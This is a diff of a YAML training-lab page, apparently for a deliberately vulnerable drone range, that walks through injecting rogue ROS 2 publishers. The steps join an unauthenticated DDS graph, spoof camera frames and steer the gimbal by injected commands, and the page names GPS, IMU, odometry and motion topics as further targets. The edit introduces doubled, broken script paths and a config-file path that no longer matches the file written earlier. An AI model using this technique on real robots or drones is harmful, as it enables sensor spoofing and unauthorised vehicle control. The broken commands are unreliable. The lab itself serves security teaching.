@@ -6,7 +6,6 @@ breadcrumb:
     link: /attacks
   - text: Injection
   - text: ROS 2 Rogue Publisher Injection
-
 sections:
   - title: Description
     content: |
@@ -16,13 +15,12 @@ sections:
 
       This walkthrough injects synthetic frames into `/webcam/image_raw` while Gazebo's legitimate camera
       plugin is also publishing. The two streams interleave at the subscriber, which is visually obvious in
-      the RTSP feed (`rtsp://10.13.0.3:554/stream1`).
+      the RTSP feed (`rtsp://$DRONE_COMPANION_IP:554/stream1`).
 
       The same technique applies to any sensor topic. If the drone published GPS fix on `/gps/fix`, IMU on
       `/imu/data`, or odometry on `/odom`, you would just retarget the publisher — the attack mechanics are
       identical. The reason this works is that ROS 2 ships without authentication on the data plane; SROS 2
       adds it but is rarely deployed in practice.
-
   - title: Resources
     content:
       - text: ROS 2 Humble Docker Image
@@ -31,20 +29,19 @@ sections:
         link: https://docs.ros.org/en/humble/Concepts/About-Quality-of-Service-Settings.html
       - text: Companion injector script
         link: /static/attacks/injection/ros2_rogue_publisher.py
-
   - title: Solution Guide
     collapsible: true
     steps:
       - title: Step 1. Stand up an attacker container on the simulator network
         description: |
-          ```docker pull osrf/ros:humble-desktop
-          docker run -it --network=simulator --ip=10.13.0.10 \
-              --name ros_humble_injector osrf/ros:humble-desktop bash
+          ```# ROS 2 Humble + CycloneDDS are already pre-configured in your AttackBox terminal!
+          # Verify your active slot peers:
+          cat /tmp/cyclonedds.xml
+          echo "ROS_DOMAIN_ID=$ROS_DOMAIN_ID"
           ```
-
       - title: Step 2. Join the lab's DDS graph
         description: |
-          ```apt-get update && apt-get install -y ros-humble-rmw-cyclonedds-cpp
+          ```# Already pre-installed in the Web Range AttackBox (zero-egress lab)
           cat > /etc/cyclonedds.xml <<'EOF'
           <?xml version="1.0" encoding="UTF-8"?>
           <CycloneDDS xmlns="https://cdds.io/config">
@@ -54,8 +51,8 @@ sections:
               </General>
               <Discovery>
                 <Peers>
-                  <Peer address="10.13.0.3"/>
-                  <Peer address="10.13.0.5"/>
+                  <Peer address="$DRONE_COMPANION_IP"/>
+                  <Peer address="$DRONE_SIM_IP"/>
                 </Peers>
               </Discovery>
             </Domain>
@@ -63,10 +60,9 @@ sections:
           EOF
           export ROS_DOMAIN_ID=42
           export RMW_IMPLEMENTATION=rmw_cyclonedds_cpp
-          export CYCLONEDDS_URI=file:///etc/cyclonedds.xml
+          export CYCLONEDDS_URI=file:///tmp/cyclonedds.xml
           source /opt/ros/humble/setup.bash
           ```
-
       - title: Step 3. Confirm the topic and its QoS
         description: |
           ```ros2 topic info /webcam/image_raw -v
@@ -81,11 +77,10 @@ sections:
           it's lower-overhead and mirrors the profile you just read off `-v`. (The one case where QoS *blocks*
           you is the reverse: reading the `BEST_EFFORT` camera with a default `RELIABLE` subscriber returns
           nothing.)
-
       - title: Step 4. Drop the injector script into the attacker container
         description: |
           The script is provided alongside this walkthrough. From the host:
-          ```docker cp ros2_rogue_publisher.py ros_humble_injector:/tmp/
+          ```docker cp /opt/dvd-tools//opt/dvd-tools/ros2_rogue_publisher.py ros_humble_injector:/tmp/
           ```
           Or paste it inline. Here it is for reference:
           ```#!/usr/bin/env python3
@@ -134,25 +129,22 @@ sections:
           if __name__ == '__main__':
               main()
           ```
-
       - title: Step 5. Watch the legitimate stream, then run the injector
         description: |
           From your Kali host, start watching the RTSP feed:
-          ```ffplay rtsp://10.13.0.3:554/stream1
+          ```ffplay rtsp://$DRONE_COMPANION_IP:554/stream1
           ```
           You should see the Gazebo world in greyscale-ish colour. Now in the attacker container:
-          ```python3 /tmp/ros2_rogue_publisher.py
+          ```python3 /tmp//opt/dvd-tools//opt/dvd-tools/ros2_rogue_publisher.py
           ```
           Within a second or two, the RTSP feed will start flickering between the legitimate Gazebo frames
           and the bright-red vertical-bar pattern. The frames are interleaving because both publishers are
           announcing to the same topic with compatible QoS.
-
       - title: Step 6. Verify with ros2 topic info
         description: |
           ```ros2 topic info /webcam/image_raw -v
           ```
           You should now see **two** publishers on the topic — the simulator and your rogue node.
-
       - title: Why this works
         description: |
           ROS 2 inherits DDS's open-by-default trust model. A participant that knows the domain ID, topic
@@ -167,7 +159,6 @@ sections:
             - `/imu/data` (`sensor_msgs/msg/Imu`) — induce bad attitude estimates
             - `/odom` (`nav_msgs/msg/Odometry`) — confuse localisation
             - Any custom command topic — issue motion commands the operator did not authorise
-
       - title: Bonus target — /gimbal/cmd (steer the camera by injection)
         description: |
           The `ros2-migration` branch wires the companion-computer's web-UI gimbal direction buttons through a
@@ -195,7 +186,7 @@ sections:
             - Defenders can't tell the difference between web-UI clicks and rogue-publisher injection
               because the bridge subscriber sees the same `Vector3` either way.
             - This attack rides the **real ArduPilot mount path**. Sniffing the MAVLink router on the
-              companion (`10.13.0.3:14550`) shows the rogue `MAV_CMD_DO_MOUNT_CONTROL` frames going to
+              companion (`$DRONE_COMPANION_IP:14550`) shows the rogue `MAV_CMD_DO_MOUNT_CONTROL` frames going to
               the flight controller, indistinguishable from frames a legitimate GCS would send. If the
               defender drops `/gimbal/cmd`, the attacker can still send mount commands directly over
               MAVLink — see the MAVLink Injection Attack scenario for that variant.
